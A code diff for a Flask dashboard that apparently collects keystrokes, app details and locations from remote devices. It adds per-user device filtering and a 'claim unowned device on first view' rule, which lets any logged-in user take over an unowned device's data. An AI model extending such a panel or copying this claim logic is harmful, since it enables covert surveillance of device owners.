@@ -1,6 +1,6 @@
 from flask import Blueprint, request, session, get_flashed_messages, flash, render_template, redirect, url_for
 from models.devices import Device, DeviceInfo, Keystroke, AppInfo, DeviceLocation
-from routes.auth import auth_required
+from user.routes.auth import auth_required
 from apis.devices import getDeviceInfo, getBatteryInfo
 import ast
 from logzero import logger
@@ -43,7 +43,10 @@ def get_devices():
     no_devices = False
     if len(alert) > 0:
         alert = alert[0]
-    devices = Device.query.all()
+    user_id = session.get('user_id')
+    devices = Device.query.filter(
+        (Device.user_id == user_id) | (Device.user_id == None)
+    ).all()
     if len(devices) == 0:
         no_devices = True
     return render_template('pages/devices.html', devices=devices, alert=alert, no_devices=no_devices, get_device_info=get_device_info, get_battery_info=get_battery_info)
@@ -53,9 +56,16 @@ def get_devices():
 @auth_required
 def get_device(device_id):
     device = Device.query.get(device_id)
+    if not device:
+        return redirect(url_for('devices.get_devices'))
     user_id = session.get('user_id')
-    # if device.user_id != user_id:
-    #     return redirect(url_for('devices.get_devices'))
+    # Claim unowned device for this user on first view
+    if device.user_id is None:
+        from config.database import db as _db
+        device.user_id = user_id
+        _db.session.commit()
+    elif device.user_id != user_id:
+        return redirect(url_for('devices.get_devices'))
     device_info = DeviceInfo.query.filter_by(
         device_id=device_id).order_by(DeviceInfo.timestamp.desc()).all()
     keystrokes = Keystroke.query.filter_by(
